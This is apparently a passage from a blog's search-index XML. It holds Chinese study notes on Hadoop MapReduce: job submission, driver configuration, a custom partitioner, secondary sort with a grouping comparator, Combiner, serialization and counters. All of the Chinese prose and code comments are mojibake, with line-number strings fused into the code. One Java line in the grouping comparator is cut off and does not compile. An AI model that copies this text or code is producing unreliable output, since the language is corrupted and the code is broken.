å…±äº«è·¯å¾„ä¸‹ä¸‹è½½ç¨‹åºjaråŒ…ç­‰ å…±äº«èµ„æº åˆ°æœ¬åœ° mrappmaster åˆ° å¯¹åº”çš„èŠ‚ç‚¹ä¸Šï¼Œå¯åŠ¨container å’Œ maptask maptaskéœ€è¦å‘ mrappmaster æ±‡æŠ¥è‡ªèº«çš„ è¿è¡ŒçŠ¶æ€å’Œè¿›åº¦ mrappmaster ç›‘æ§åˆ°æ‰€æœ‰çš„maptask è¿è¡Œè¿›åº¦åˆ° 80%ï¼Œå¯åŠ¨reducetaskï¼ˆå¯åŠ¨å‰ï¼Œä¹Ÿä¼šä¸‹è½½å…±äº«èµ„æºè·¯å¾„ä¸‹çš„å“åº”æ–‡ä»¶ï¼Œç¨‹åºjaråŒ…ï¼Œé…ç½®æ–‡ä»¶ç­‰ï¼‰ reducetask æ—¶åˆ»å’Œ mrappmaster é€šä¿¡ï¼Œæ±‡æŠ¥è‡ªèº«çš„ è¿è¡ŒçŠ¶æ€å’Œè¿›åº¦ æ•´ä¸ªè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œmaptaskè¿è¡Œå®Œæˆ ï¼Œ éƒ½ä¼šå‘mrappmaster ç”³è¯·æ³¨é”€ è‡ªå·± å½“æ‰€æœ‰çš„maptask å’Œ reducetask è¿è¡Œå®Œæˆ ï¼Œ mrappmaster å°±ä¼šå‘rm ç”³è¯·æ³¨é”€ï¼Œè¿›è¡Œèµ„æºå›æ”¶ 4.MapReduce&amp;yarnçš„å·¥ä½œæœºåˆ¶â€“jobæäº¤æµç¨‹â€“å¸æ˜Ÿå¤§æ³• ç–‘ç‚¹: MRAppMaster çš„æ•°é‡é—®é¢˜ ç»è¿‡ç ”ç©¶, åº”è¯¥æ˜¯æ¯ä¸ª job ä¼šäº§ç”Ÿä¸€ä¸ª MRAppMaster 5.MapReduceå…¨åŸç†å‰–æâ€”å…­è„‰ç¥å‰‘å…¨å›¾ ç»†èŠ‚å›¾ 6. maptaskä»»åŠ¡åˆ†é…åˆ‡ç‰‡æœºåˆ¶ 7. å®Œæ•´æµç¨‹å›¾ 14. å…³äº Driver é…ç½®çš„æ³¨æ„ç‚¹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.IntWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.lib.input.CombineTextInputFormat;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;/** * ç›¸å½“äºä¸€ä¸ªyarné›†ç¾¤çš„å®¢æˆ·ç«¯ * éœ€è¦åœ¨æ­¤å°è£…æˆ‘ä»¬çš„mrç¨‹åºçš„ç›¸å…³è¿è¡Œå‚æ•°ï¼ŒæŒ‡å®šjaråŒ… * æœ€åæäº¤ç»™yarn * @author * */public class WordcountDriver &#123; public static void main(String[] args) throws Exception &#123; Configuration conf = new Configuration(); //æ˜¯å¦è¿è¡Œä¸ºæœ¬åœ°æ¨¡å¼ï¼Œå°±æ˜¯çœ‹è¿™ä¸ªå‚æ•°å€¼æ˜¯å¦ä¸ºlocalï¼Œé»˜è®¤å°±æ˜¯local /*conf.set("mapreduce.framework.name", "local");*/ //æœ¬åœ°æ¨¡å¼è¿è¡Œmrç¨‹åºæ—¶ï¼Œè¾“å…¥è¾“å‡ºçš„æ•°æ®å¯ä»¥åœ¨æœ¬åœ°ï¼Œä¹Ÿå¯ä»¥åœ¨hdfsä¸Š //åˆ°åº•åœ¨å“ªé‡Œï¼Œå°±çœ‹ä»¥ä¸‹ä¸¤è¡Œé…ç½®ä½ ç”¨å“ªè¡Œï¼Œé»˜è®¤å°±æ˜¯file:/// /*conf.set("fs.defaultFS", "hdfs://mini1:9000/");*/ /*conf.set("fs.defaultFS", "file:///");*/ //è¿è¡Œé›†ç¾¤æ¨¡å¼ï¼Œå°±æ˜¯æŠŠç¨‹åºæäº¤åˆ°yarnä¸­å»è¿è¡Œ //è¦æƒ³è¿è¡Œä¸ºé›†ç¾¤æ¨¡å¼ï¼Œä»¥ä¸‹3ä¸ªå‚æ•°è¦æŒ‡å®šä¸ºé›†ç¾¤ä¸Šçš„å€¼ /*conf.set("mapreduce.framework.name", "yarn"); conf.set("yarn.resourcemanager.hostname", "mini1"); conf.set("fs.defaultFS", "hdfs://mini1:9000/");*/ Job job = Job.getInstance(conf); job.setJar("c:/wc.jar"); //æŒ‡å®šæœ¬ç¨‹åºçš„jaråŒ…æ‰€åœ¨çš„æœ¬åœ°è·¯å¾„ /*job.setJarByClass(WordcountDriver.class);*/ //æŒ‡å®šæœ¬ä¸šåŠ¡jobè¦ä½¿ç”¨çš„mapper/Reducerä¸šåŠ¡ç±» job.setMapperClass(WordcountMapper.class); job.setReducerClass(WordcountReducer.class); //æŒ‡å®šmapperè¾“å‡ºæ•°æ®çš„kvç±»å‹ job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(IntWritable.class); //æŒ‡å®šæœ€ç»ˆè¾“å‡ºçš„æ•°æ®çš„kvç±»å‹ job.setOutputKeyClass(Text.class); job.setOutputValueClass(IntWritable.class); //æŒ‡å®šéœ€è¦ä½¿ç”¨combinerï¼Œä»¥åŠç”¨å“ªä¸ªç±»ä½œä¸ºcombinerçš„é€»è¾‘ /*job.setCombinerClass(WordcountCombiner.class);*/ job.setCombinerClass(WordcountReducer.class); //å¦‚æœä¸è®¾ç½®InputFormatï¼Œå®ƒé»˜è®¤ç”¨çš„æ˜¯TextInputformat.class job.setInputFormatClass(CombineTextInputFormat.class); CombineTextInputFormat.setMaxInputSplitSize(job, 4194304); CombineTextInputFormat.setMinInputSplitSize(job, 2097152); //æŒ‡å®šjobçš„è¾“å…¥åŸå§‹æ–‡ä»¶æ‰€åœ¨ç›®å½• FileInputFormat.setInputPaths(job, new Path(args[0])); //æŒ‡å®šjobçš„è¾“å‡ºç»“æœæ‰€åœ¨ç›®å½• FileOutputFormat.setOutputPath(job, new Path(args[1])); // æŒ‡å®šéœ€è¦ç¼“å­˜ä¸€ä¸ªæ–‡ä»¶åˆ°æ‰€æœ‰çš„maptaskè¿è¡ŒèŠ‚ç‚¹å·¥ä½œç›®å½• /* job.addArchiveToClassPath(archive); */// ç¼“å­˜jaråŒ…åˆ°taskè¿è¡ŒèŠ‚ç‚¹çš„classpathä¸­ /* job.addFileToClassPath(file); */// ç¼“å­˜æ™®é€šæ–‡ä»¶åˆ°taskè¿è¡ŒèŠ‚ç‚¹çš„classpathä¸­ /* job.addCacheArchive(uri); */// ç¼“å­˜å‹ç¼©åŒ…æ–‡ä»¶åˆ°taskè¿è¡ŒèŠ‚ç‚¹çš„å·¥ä½œç›®å½• /* job.addCacheFile(uri) */// ç¼“å­˜æ™®é€šæ–‡ä»¶åˆ°taskè¿è¡ŒèŠ‚ç‚¹çš„å·¥ä½œç›®å½• // å°†äº§å“è¡¨æ–‡ä»¶ç¼“å­˜åˆ°taskå·¥ä½œèŠ‚ç‚¹çš„å·¥ä½œç›®å½•ä¸­å» job.addCacheFile(new URI("file:/D:/srcdata/mapjoincache/pdts.txt")); //mapç«¯joinçš„é€»è¾‘ä¸éœ€è¦reduceé˜¶æ®µï¼Œè®¾ç½®reducetaskæ•°é‡ä¸º0 job.setNumReduceTasks(0); //å°†jobä¸­é…ç½®çš„ç›¸å…³å‚æ•°ï¼Œä»¥åŠjobæ‰€ç”¨çš„javaç±»æ‰€åœ¨çš„jaråŒ…ï¼Œæäº¤ç»™yarnå»è¿è¡Œ /*job.submit();*/ boolean res = job.waitForCompletion(true); System.exit(res?0:1); &#125;&#125; 15. GroupingComparator åˆ†ç»„æ’åºè§ç»ƒä¹  æˆ–è€…github æ³¨æ„ç‚¹: åˆ†åŒºçš„æ•°é‡ 12345678910111213import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.mapreduce.Partitioner;public class ItemIdPartitioner extends Partitioner&lt;OrderBean, NullWritable&gt;&#123; @Override public int getPartition(OrderBean bean, NullWritable value, int numReduceTasks) &#123; //ç›¸åŒidçš„è®¢å•beanï¼Œä¼šå‘å¾€ç›¸åŒçš„partition //è€Œä¸”ï¼Œäº§ç”Ÿçš„åˆ†åŒºæ•°ï¼Œæ˜¯ä¼šè·Ÿç”¨æˆ·è®¾ç½®çš„reduce taskæ•°ä¿æŒä¸€è‡´ return (bean.getItemid().hashCode() &amp; Integer.MAX_VALUE) % numReduceTasks; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import java.io.DataInput;import java.io.DataOutput;import java.io.IOException;import org.apache.hadoop.io.DoubleWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.io.WritableComparable;public class OrderBean implements WritableComparable&lt;OrderBean&gt;&#123; private Text itemid; private DoubleWritable amount; public OrderBean() &#123; &#125; public OrderBean(Text itemid, DoubleWritable amount) &#123; set(itemid, amount); &#125; public void set(Text itemid, DoubleWritable amount) &#123; this.itemid = itemid; this.amount = amount; &#125; public Text getItemid() &#123; return itemid; &#125; public DoubleWritable getAmount() &#123; return amount; &#125; @Override public int compareTo(OrderBean o) &#123; int cmp = this.itemid.compareTo(o.getItemid()); if (cmp == 0) &#123; cmp = -this.amount.compareTo(o.getAmount()); &#125; return cmp; &#125; @Override public void write(DataOutput out) throws IOException &#123; out.writeUTF(itemid.toString()); out.writeDouble(amount.get()); &#125; @Override public void readFields(DataInput in) throws IOException &#123; String readUTF = in.readUTF(); double readDouble = in.readDouble(); this.itemid = new Text(readUTF); this.amount= new DoubleWritable(readDouble); &#125; @Override public String toString() &#123; return itemid.toString() + "\t" + amount.get(); &#125;&#125; 1234567891011121314151617181920212223242526package cn.itcastcat.bigdata.secondarysort;import org.apache.hadoop.io.WritableComparable;import org.apache.hadoop.io.WritableComparator;/** * åˆ©ç”¨reduceç«¯çš„GroupingComparatoræ¥å®ç°å°†ä¸€ç»„beançœ‹æˆç›¸åŒçš„key * @author duanhaitao@itcast.cn * */public class ItemidGroupingComparator extends WritableComparator &#123; //ä¼ å…¥ä½œä¸ºkeyçš„beançš„classç±»å‹ï¼Œä»¥åŠåˆ¶å®šéœ€è¦è®©æ¡†æ¶åšåå°„è·å–å®ä¾‹å¯¹è±¡ protected ItemidGroupingComparator() &#123; super(OrderBean.class, true); &#125; @Override public int compare(WritableComparable a, WritableComparable b) &#123; OrderBean abean = (OrderBean) a; OrderBean bbean = (OrderBean) b; //æ¯”è¾ƒä¸¤ä¸ªbeanæ—¶ï¼ŒæŒ‡å®šåªæ¯”è¾ƒbeanä¸­çš„orderid return abean.getItemid().compareTo(bbean.getItemid( &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import java.io.IOException;import org.apache.commons.lang.StringUtils;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.DoubleWritable;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;import com.sun.xml.bind.v2.schemagen.xmlschema.List;/** * * @author duanhaitao@itcast.cn * */public class SecondarySort &#123; static class SecondarySortMapper extends Mapper&lt;LongWritable, Text, OrderBean, NullWritable&gt;&#123; OrderBean bean = new OrderBean(); @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String line = value.toString(); String[] fields = StringUtils.split(line, ","); bean.set(new Text(fields[0]), new DoubleWritable(Double.parseDouble(fields[2]))); context.write(bean, NullWritable.get()); &#125; &#125; static class SecondarySortReducer extends Reducer&lt;OrderBean, NullWritable, OrderBean, NullWritable&gt;&#123; //åˆ°è¾¾reduceæ—¶ï¼Œç›¸åŒidçš„æ‰€æœ‰beanå·²ç»è¢«çœ‹æˆä¸€ç»„ï¼Œä¸”é‡‘é¢æœ€å¤§çš„é‚£ä¸ªä¸€æ’åœ¨ç¬¬ä¸€ä½ @Override protected void reduce(OrderBean key, Iterable&lt;NullWritable&gt; values, Context context) throws IOException, InterruptedException &#123; context.write(key, NullWritable.get()); &#125; &#125; public static void main(String[] args) throws Exception &#123; Configuration conf = new Configuration(); Job job = Job.getInstance(conf); job.setJarByClass(SecondarySort.class); job.setMapperClass(SecondarySortMapper.class); job.setReducerClass(SecondarySortReducer.class); job.setOutputKeyClass(OrderBean.class); job.setOutputValueClass(NullWritable.class); FileInputFormat.setInputPaths(job, new Path("c:/wordcount/gpinput")); FileOutputFormat.setOutputPath(job, new Path("c:/wordcount/gpoutput")); //åœ¨æ­¤è®¾ç½®è‡ªå®šä¹‰çš„Groupingcomparatorç±» job.setGroupingComparatorClass(ItemidGroupingComparator.class); //åœ¨æ­¤è®¾ç½®è‡ªå®šä¹‰çš„partitionerç±» job.setPartitionerClass(ItemIdPartitioner.class); job.setNumReduceTasks(2); job.waitForCompletion(true); &#125;&#125;]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduceç¬”è®°-2 ä¸‰å¤§ç»„ä»¶-Partitioneråˆ†åŒº,sortæ’åº,Combinerå±€éƒ¨åˆ†åŒº]]></title>
    <url>%2F2018%2F06%2F07%2FHadoop%2F2-MapReduce%2FMapReduce%E7%AC%94%E8%AE%B0-2%2F</url>
    <content type="text"><![CDATA[1. Combiner ç»„ä»¶1. äº§ç”Ÿç¼˜ç”±ï¼šCombiner æ˜¯ MapReduce ç¨‹åºä¸­ Mapper å’Œ Reducer ä¹‹å¤–çš„ä¸€ç§ç»„ä»¶ï¼Œå®ƒçš„ä½œç”¨æ˜¯åœ¨ maptask ä¹‹åç»™ maptask çš„ç»“æœè¿›è¡Œå±€éƒ¨æ±‡æ€»ï¼Œä»¥å‡è½» reducetask çš„è®¡ç®—è´Ÿè½½ï¼Œå‡å°‘ç½‘ç»œä¼ è¾“ Combiner ç»„ä»¶çš„ä½œç”¨ï¼š å‡å°‘ reduce ç«¯çš„æ•°æ®é‡ å‡å°‘ shuffle è¿‡ç¨‹çš„æ•°æ®é‡ åœ¨ map ç«¯åšäº†ä¸€æ¬¡åˆå¹¶ï¼Œæé«˜åˆ†å¸ƒå¼è®¡ç®—ç¨‹åºçš„æ•´ä½“æ€§èƒ½ Combiner ç»„ä»¶å¸® reduce åˆ†æ‹…å‹åŠ›ï¼Œ å› æ­¤å…¶ä¸šåŠ¡é€»è¾‘å’Œ reduce ä¸­çš„ä¸šåŠ¡é€»è¾‘ç›¸ä¼¼ 2.è‡ªå®šä¹‰ Combiner ç»„ä»¶ï¼šé»˜è®¤æƒ…å†µä¸‹æ²¡æœ‰ Combiner ç»„ä»¶ï¼ŒCombiner ä½œç”¨æ—¶é—´ç‚¹ â€” mapâ€“combinerâ€“reduce ç»§æ‰¿ Reduce ç±» public class MyCombiner extends Reducer&lt;å‰ä¸¤ä¸ªï¼š map çš„è¾“å‡ºï¼Œ åä¸¤ä¸ªï¼š reduce çš„è¾“å…¥&gt;{} æˆ‘ä»¬åœ¨å†™ MapReduce ç¨‹åºçš„æ—¶å€™ï¼Œ map çš„è¾“å‡ºå°±æ˜¯ reduce çš„è¾“å…¥ ä¹Ÿå°±æ˜¯è¯´ï¼Œ è¿™ä¸ª MyCombiner() çš„å‰ä¸¤ä¸ªæ³›å‹å’Œåä¸¤ä¸ªæ³›å‹çš„ç±»å‹ä¸€è‡´ é‡å†™ reduce æ–¹æ³• Combiner æœ¬è´¨ä¸Šç›¸å½“äº åœ¨ map ç«¯è¿›è¡Œäº†ä¸€æ¬¡ reduce æ“ä½œï¼Œ é€šå¸¸æƒ…å†µä¸‹ç›´æ¥ä½¿ç”¨ reducer çš„ç±»ä½œä¸º Combiner çš„ç±»ï¼Œä¸å†å•ç‹¬å†™ Combiner ä»£ç é€»è¾‘ åœ¨ Job ä¸­åŠ ä¸Šjob.setCombinerClass(WorldcountReduce.class)ï¼Œ å°±ä¼šè°ƒç”¨ Combiner Combiner ä½¿ç”¨åŸåˆ™ æœ‰æˆ–æ²¡æœ‰éƒ½ä¸èƒ½å½±å“ä¸šåŠ¡é€»è¾‘ï¼Œéƒ½ä¸èƒ½å½±å“æœ€ç»ˆç»“æœã€‚æ¯”å¦‚ç´¯åŠ ï¼Œæœ€å¤§å€¼ç­‰ï¼Œæ±‚å¹³å‡å€¼å°±ä¸èƒ½ç”¨ã€‚ 2ã€MapReduce ä¸­çš„åºåˆ—åŒ–2.1ã€æ¦‚è¿°Java çš„åºåˆ—åŒ–æ˜¯ä¸€ä¸ªé‡é‡çº§åºåˆ—åŒ–æ¡†æ¶ï¼ˆSerializableï¼‰ï¼Œä¸€ä¸ªå¯¹è±¡è¢«åºåˆ—åŒ–åï¼Œä¼šé™„å¸¦å¾ˆå¤šé¢ å¤–çš„ä¿¡æ¯ï¼ˆå„ç§æ ¡éªŒä¿¡æ¯ï¼Œheaderï¼Œç»§æ‰¿ä½“ç³»ç­‰ï¼‰ï¼Œä¸ä¾¿äºåœ¨ç½‘ç»œä¸­é«˜æ•ˆä¼ è¾“ï¼› Hadoop è‡ªå·±å¼€å‘äº†ä¸€å¥—åºåˆ—åŒ–æœºåˆ¶ï¼ˆå‚ä¸åºåˆ—åŒ–çš„å¯¹è±¡çš„ç±»éƒ½è¦å®ç° Writable æ¥å£ï¼‰ï¼Œç²¾ç®€ï¼Œé«˜æ•ˆ Java åŸºæœ¬ç±»å‹ &amp; Hadoop ç±»å‹å¯¹ç…§è¡¨123456789101112131415161718// Java &amp; Hadoopç±»å‹å‚ç…§hadoopæ•°æ®ç±»å‹ &lt;------------&gt; javaæ•°æ®ç±»å‹: å¸ƒå°”å‹ï¼š BooleanWritable &lt;------------&gt; boolean æ•´å‹ï¼š ByteWritable &lt;------------&gt; byte ShortWritable &lt;------------&gt; short IntWritable &lt;------------&gt; int LongWritable &lt;------------&gt; long æµ®ç‚¹å‹ï¼š FloatWritable &lt;------------&gt; float DoubleWritable &lt;------------&gt; double å­—ç¬¦ä¸²ï¼ˆæ–‡æœ¬ï¼‰ï¼š Text &lt;------------&gt; String æ•°ç»„ï¼š ArrayWritable &lt;------------&gt; Array mapé›†åˆï¼š MapWritable &lt;------------&gt; map 2.2ã€è‡ªå®šä¹‰å¯¹è±¡å®ç° MapReduce æ¡†æ¶çš„åºåˆ—åŒ–è¦å®ç°WritableComparableæ¥å£ï¼Œå› ä¸º MapReduce æ¡†æ¶ä¸­çš„ shuffle è¿‡ç¨‹ä¸€å®šä¼šå¯¹ key è¿›è¡Œæ’åº 123456789101112131415161718//åºåˆ—åŒ–æ–¹æ³•@Overridepublic void write(DataOutput out) throws IOException &#123; out.writeUTF(phone); out.writeLong(upfFlow); out.writeLong(downFlow); out.writeLong(sumFlow);&#125;//ååºåˆ—åŒ–æ–¹æ³•//æ³¨æ„ï¼š å­—æ®µçš„ååºåˆ—åŒ–é¡ºåºä¸åºåˆ—åŒ–æ—¶çš„é¡ºåºä¿æŒä¸€è‡´,ä¸¦ä¸”ç±»å‹ä¹Ÿä¸€è‡´@Overridepublic void readFields(DataInput in) throws IOException &#123; this.phone = in.readUTF(); this.upfFlow = in.readLong(); this.downFlow = in.readLong(); this.sumFlow = in.readLong();&#125; 3. MapReduceä¸­çš„Sort â€“TODOã€‚ã€‚MapTask â€“&gt; ReduceTask ä¹‹é—´ï¼Œ æ¡†æ¶é»˜è®¤æ·»åŠ äº†æ’åº æ’åºçš„è§„åˆ™æ˜¯æŒ‰ç…§Map ç«¯è¾“å‡ºçš„ key çš„å­—å…¸é¡ºåºè¿›è¡Œæ’åº 1ã€ å¦‚æœæ²¡æœ‰é‡å†™ WritableComparable æ—¶ï£¿ æŒ‰å•è¯ç»Ÿè®¡ä¸­è¯é¢‘å‡ºç°çš„æ­¤å¤„è¿›è¡Œæ’åºï¼Œ æŒ‰ç…§å‡ºç°çš„æ¬¡æ•°ï¼Œ ä»ä½åˆ°é«˜ å¦‚æœæƒ³è¦å¯¹è¯é¢‘è¿›è¡Œæ’åºï¼Œ é‚£ä¹ˆè¯é¢‘åº”è¯¥æ”¾åœ¨ map è¾“å‡º key çš„ä½ç½® ä»£ç å®ç°ï¼š 1234567ï£¿ï£¿ï£¿ï£¿ Map ï£¿ï£¿ï£¿ï£¿//è¯é¢‘ä¸º keyï¼Œ å…¶å®ƒä¸º valueï£¿ï£¿ï£¿ï£¿ Reduce ï£¿ï£¿ï£¿ï£¿// å°† map è¾“å…¥çš„ç»“æœåè½¬(k,v æ¢ä½ç½®), è¾“å‡ºæœ€ç»ˆç»“æœ// æœ€åè¾“å‡ºè¿˜æ˜¯æŒ‰ç…§å·¦è¾¹è¯, å³è¾¹æ¬¡æ•°// psï¼š å¦‚æœå€’åºæ’çš„æ—¶å€™, map çš„æ—¶å€™å‘çš„æ—¶å€™ åŠ ä¸Š-, reduce å‘çš„æ—¶å€™, å†åŠ ä¸Š-, è½¬æˆ IntWritable 2ã€è‡ªå®šä¹‰æ’åºè¦å®ç°WritableComparableæ¥å£ è‡ªå®šä¹‰çš„ç±»å¿…é¡»æ”¾åœ¨ key çš„ä½ç½® å®ç°WritableComparableæ¥å£ï¼Œ é‡å†™ compareTo()æ–¹æ³• å¾…æ‰©å±•â€¦ ä½œä¸šï¼š å¢å¼ºéœ€æ±‚ï¼š æŒ‰ç…§æ€»æµé‡æ’åºï¼Œ æ€»æµé‡ç›¸åŒæ—¶ï¼Œ æŒ‰ç…§æ‰‹æœºå·ç æ’åº 4ã€MapReduce ä¸­çš„æ•°æ®åˆ†å‘ç»„ä»¶ Partitionerï¼ˆåˆ†åŒºï¼‰éœ€æ±‚ï¼š æ ¹æ®å½’å±åœ°è¾“å‡ºæµé‡ç»Ÿè®¡æ•°æ®ç»“æœåˆ°ä¸åŒæ–‡ä»¶ï¼Œä»¥ä¾¿äºåœ¨æŸ¥è¯¢ç»Ÿè®¡ç»“æœæ—¶å¯ä»¥å®šä½åˆ° çœçº§èŒƒå›´è¿›è¡Œ æ€è·¯ï¼šMapReduce ä¸­ä¼šå°† map è¾“å‡ºçš„ kv å¯¹ï¼ŒæŒ‰ç…§ç›¸åŒ key åˆ†ç»„ï¼Œç„¶ååˆ†å‘ç»™ä¸åŒçš„ reducetask æ‰§è¡Œæ—¶æœº: åœ¨Mapè¾“å‡º kv å¯¹ä¹‹å, æ‰€æºå¸¦çš„ k,v å‚æ•°ï¼Œè·Ÿ Map è¾“å‡ºç›¸åŒ MapReduce é»˜è®¤çš„åˆ†å‘è§„åˆ™ä¸ºï¼šæ ¹æ® key çš„ hashcode%reducetask æ•°æ¥åˆ†å‘ï¼Œæ‰€ä»¥ï¼šå¦‚æœè¦æŒ‰ç…§æˆ‘ä»¬è‡ª å·±çš„éœ€æ±‚è¿›è¡Œåˆ†ç»„ï¼Œåˆ™éœ€è¦æ”¹å†™æ•°æ®åˆ†å‘ï¼ˆåˆ†åŒºï¼‰ç»„ä»¶ Partitioner Partitioné‡ç‚¹æ€»ç»“ï¼š Partition çš„ key value, å°±æ˜¯Mapperè¾“å‡ºçš„key value public abstract int getPartition(KEY key, VALUE value, int numPartitions); è¾“å…¥æ˜¯Mapçš„ç»“æœå¯¹&lt;key, value&gt;å’ŒReducerçš„æ•°ç›®ï¼Œè¾“å‡ºåˆ™æ˜¯åˆ†é…çš„Reducerï¼ˆæ•´æ•°ç¼–å·ï¼‰ã€‚å°±æ˜¯æŒ‡å®šMapprè¾“å‡ºçš„é”®å€¼å¯¹åˆ°å“ªä¸€ä¸ªreducerä¸Šå»ã€‚ç³»ç»Ÿç¼ºçœçš„Partitioneræ˜¯HashPartitionerï¼Œå®ƒä»¥keyçš„Hashå€¼å¯¹Reducerçš„æ•°ç›®å–æ¨¡ï¼Œå¾—åˆ°å¯¹åº”çš„Reducerã€‚è¿™æ ·ä¿è¯å¦‚æœæœ‰ç›¸åŒçš„keyå€¼ï¼Œè‚¯å®šè¢«åˆ†é…åˆ°åŒä¸€ä¸ªreducreä¸Šã€‚å¦‚æœæœ‰Nä¸ªreducerï¼Œç¼–å·å°±ä¸º0,1,2,3â€¦â€¦(N-1)ã€‚ MapReduce ä¸­ä¼šå°† map è¾“å‡ºçš„ kv å¯¹ï¼ŒæŒ‰ç…§ç›¸åŒ key åˆ†ç»„ï¼Œç„¶ååˆ†å‘ç»™ä¸åŒçš„ reducetask é»˜è®¤çš„åˆ†å‘è§„åˆ™ä¸º:æ ¹æ® key çš„ hashcode%reducetask æ•°æ¥åˆ†å‘ï¼Œæ‰€ä»¥:å¦‚æœè¦æŒ‰ç…§æˆ‘ä»¬è‡ª å·±çš„éœ€æ±‚è¿›è¡Œåˆ†ç»„ï¼Œåˆ™éœ€è¦æ”¹å†™æ•°æ®åˆ†å‘(åˆ†ç»„)ç»„ä»¶ Partitioner, è‡ªå®šä¹‰ä¸€ä¸ª CustomPartitioner ç»§æ‰¿æŠ½è±¡ç±»:Partitioner å› æ­¤ï¼Œ Partitioner çš„æ‰§è¡Œæ—¶æœºï¼Œ æ˜¯åœ¨Mapè¾“å‡º kv å¯¹ä¹‹å Partitioner å®ç°è¿‡ç¨‹ å…ˆåˆ†æä¸€ä¸‹å…·ä½“çš„ä¸šåŠ¡é€»è¾‘ï¼Œç¡®å®šå¤§æ¦‚æœ‰å¤šå°‘ä¸ªåˆ†åŒº é¦–å…ˆä¹¦å†™ä¸€ä¸ªç±»ï¼Œå®ƒè¦ç»§æ‰¿ org.apache.hadoop.mapreduce.Partitionerè¿™ä¸ªæŠ½è±¡ç±» é‡å†™public int getPartitionè¿™ä¸ªæ–¹æ³•ï¼Œæ ¹æ®å…·ä½“é€»è¾‘ï¼Œè¯»æ•°æ®åº“æˆ–è€…é…ç½®è¿”å›ç›¸åŒçš„æ•°å­— åœ¨mainæ–¹æ³•ä¸­è®¾ç½®Partionerçš„ç±»ï¼Œjob.setPartitionerClass(DataPartitioner.class); è®¾ç½®Reducerçš„æ•°é‡ï¼Œjob.setNumReduceTasks(6); å…¸å‹çš„ Partitioner ä»£ç å®ç°12345678910111213141516171819202122import java.util.HashMap;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Partitioner;public class ProvincePartitioner extends Partitioner&lt;Text, FlowBean&gt; &#123; private static HashMap&lt;String, Integer&gt; provincMap = new HashMap&lt;String, Integer&gt;(); static &#123; provincMap.put("138", 0); provincMap.put("139", 1); provincMap.put("136", 2); provincMap.put("137", 3); provincMap.put("135", 4); &#125; @Override public int getPartition(Text key, FlowBean value, int numPartitions) &#123; Integer code = provincMap.get(key.toString().substring(0, 3)); if (code != null) &#123; return code; &#125; return 5; &#125;&#125; 5ã€å…¨å±€è®¡æ•°å™¨1. æ¡†æ¶å†…ç½®è®¡æ•°å™¨ï¼š Hadoopå†…ç½®çš„è®¡æ•°å™¨ï¼Œä¸»è¦ç”¨æ¥è®°å½•ä½œä¸šçš„æ‰§è¡Œæƒ…å†µ å†…ç½®è®¡æ•°å™¨åŒ…æ‹¬ MapReduceæ¡†æ¶è®¡æ•°å™¨ï¼ˆMap-Reduce Frameworkï¼‰ æ–‡ä»¶ç³»ç»Ÿè®¡æ•°å™¨ï¼ˆFielSystemCountersï¼‰ ä½œä¸šè®¡æ•°å™¨ï¼ˆJob Countersï¼‰ æ–‡ä»¶è¾“å…¥æ ¼å¼è®¡æ•°å™¨ï¼ˆFile Output Format Countersï¼‰ æ–‡ä»¶è¾“å‡ºæ ¼å¼è®¡æ•°å™¨ï¼ˆFile Input Format Counters) è®¡æ•°å™¨ç”±ç›¸å…³çš„taskè¿›è¡Œç»´æŠ¤ï¼Œå®šæœŸä¼ é€’ç»™tasktrackerï¼Œå†ç”±tasktrackerä¼ ç»™jobtrackerï¼› æœ€ç»ˆçš„ä½œä¸šè®¡æ•°å™¨å®é™…ä¸Šæ˜¯æœ‰jobtrackerç»´æŠ¤ï¼Œæ‰€ä»¥è®¡æ•°å™¨å¯ä»¥è¢«å…¨å±€æ±‡æ€»ï¼ŒåŒæ—¶ä¹Ÿä¸å¿…åœ¨æ•´ä¸ªç½‘ç»œä¸­ä¼ é€’ åªæœ‰å½“ä¸€ä¸ªä½œä¸šæ‰§è¡ŒæˆåŠŸåï¼Œæœ€ç»ˆçš„è®¡æ•°å™¨çš„å€¼æ‰æ˜¯å®Œæ•´å¯é çš„ï¼› 2. è‡ªå®šä¹‰çš„è®¡æ•°å™¨åº”ç”¨åœºæ™¯ ç”¨æ¥ç»Ÿè®¡è¿è¡Œè¿‡ç¨‹ä¸­çš„è¿›åº¦å’ŒçŠ¶æ€ï¼Œ ç±»ä¼¼äº job è¿è¡Œçš„ä¸€ä¸ªæŠ¥å‘Šã€æ—¥å¿— è¦å°†æ•°æ®å¤„ç†è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸åˆè§„æ•°æ®è¡Œè¿›è¡Œå…¨å±€è®¡æ•°ï¼Œç±»ä¼¼è¿™ ç§éœ€æ±‚å¯ä»¥å€ŸåŠ© MapReduce æ¡†æ¶ä¸­æä¾›çš„å…¨å±€è®¡æ•°å™¨æ¥å®ç° è®¡æ•°å™¨çš„å€¼å¯ä»¥åœ¨mapperæˆ–reducerä¸­å¢åŠ  ä½¿ç”¨æ–¹å¼ 